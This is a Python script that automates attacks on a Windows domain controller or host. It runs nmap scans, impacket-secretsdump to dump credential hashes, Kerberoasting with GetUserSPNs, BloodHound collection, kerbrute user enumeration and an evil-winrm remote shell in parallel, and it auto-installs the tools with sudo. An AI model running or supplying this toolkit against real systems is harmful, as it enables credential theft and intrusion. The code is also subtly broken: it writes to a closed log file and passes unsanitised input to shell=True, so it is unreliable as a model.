#!/usr/bin/env python3

import os
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor

# ANSI colors for better output readability
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"

def print_status(message, status="info"):
    """Prints colored status messages."""
    color = {"info": GREEN, "warn": YELLOW, "error": RED}.get(status, RESET)
    print(f"{color}[+] {message}{RESET}")

def run_command(command, output_file):
    """Runs a system command, prints output in real-time, and writes it to a file."""
    print_status(f"Running: {command}")

    with open(output_file, "a") as f:
        f.write(f"\n[+] Running: {command}\n")

    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in process.stdout:
            print(line, end='')
            f.write(line)
        process.wait()
    except Exception as e:
        print_status(f"Error executing {command}: {e}", "error")

def check_and_install_tools():
    """Checks if required tools are installed, installs missing ones globally."""
    tools = {
        "nmap": "nmap",
        "crackmapexec": "crackmapexec",
        "impacket-secretsdump": "impacket-scripts",
        "bloodhound-python": "bloodhound-python",
        "ldapsearch": "ldap-utils",
        "smbmap": "smbmap",
        "enum4linux-ng": "enum4linux-ng",
        "kerbrute": "kerbrute",
        "ldapdomaindump": "ldapdomaindump",
        "rdp-sec-check": "rdp-sec-check",
        "evil-winrm": "evil-winrm",
        "winrm-cli": "winrm-cli",
        "rpcclient": "samba-common-bin",
        "gpoenum": "gpoenum"
    }

    for tool, package in tools.items():
        if subprocess.call(["which", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            print_status(f"{tool} not found, installing...", "warn")
            subprocess.run(["sudo", "apt", "install", "-y", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if subprocess.call(["which", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                print_status(f"{tool} installed successfully.")
            else:
                print_status(f"Failed to install {tool}.", "error")
        else:
            print_status(f"{tool} is already installed.")

def enumerate_windows(target_ip, domain, output_file, username, password):
    """Runs enumeration commands in parallel for efficiency."""
    print_status("Starting Windows enumeration...")

    commands = [
        f"nmap -T4 -p- --open {target_ip}",
        f"crackmapexec smb {target_ip} -u {username} -p {password}",
        f"impacket-secretsdump {username}:{password}@{target_ip}",
        f"GetUserSPNs.py {domain}/{username}:{password} -dc-ip {target_ip}",
        f"bloodhound-python -u {username} -p {password} -d {domain} -c All --zip",
        f"ldapsearch -x -h {target_ip} -b 'dc={domain.replace('.', ',dc=')}'",
        f"smbmap -H {target_ip} -u {username} -p {password}",
        f"enum4linux-ng -A {target_ip}",
        f"kerbrute userenum -d {domain} --dc {target_ip} userlist.txt",
        f"ldapdomaindump ldap://{target_ip}",
        f"rdp-sec-check -t {target_ip}",
        f"evil-winrm -i {target_ip} -u {username} -p {password}",
        f"winrm-cli {target_ip} -u {username} -p {password}",
        f"rpcclient -U {username}%{password} {target_ip} -c 'enumdomusers'",
        f"gpoenum {target_ip} -u {username} -p {password}"
    ]

    # Run commands in parallel
    with ThreadPoolExecutor(max_workers=5) as executor:
        for cmd in commands:
            executor.submit(run_command, cmd, output_file)

    print_status(f"Windows enumeration complete! Results saved to {output_file}")

def main():
    print_status("Checking for required tools...")
    check_and_install_tools()

    # Gather user input safely
    target_ip = input("Enter Target IP Address: ").strip()
    domain = input("Enter Domain: ").strip()
    username = input("Enter valid Windows username: ").strip()
    password = input("Enter password for the Windows user: ").strip()
    output_file = input("Enter output filename (default: windows_enum_results.txt): ").strip() or "windows_enum_results.txt"

    if not target_ip:
        print_status("Target IP is required!", "error")
        sys.exit(1)

    enumerate_windows(target_ip, domain, output_file, username, password)

    print_status(f"All enumeration results saved in {output_file}")

if __name__ == "__main__":
    main()

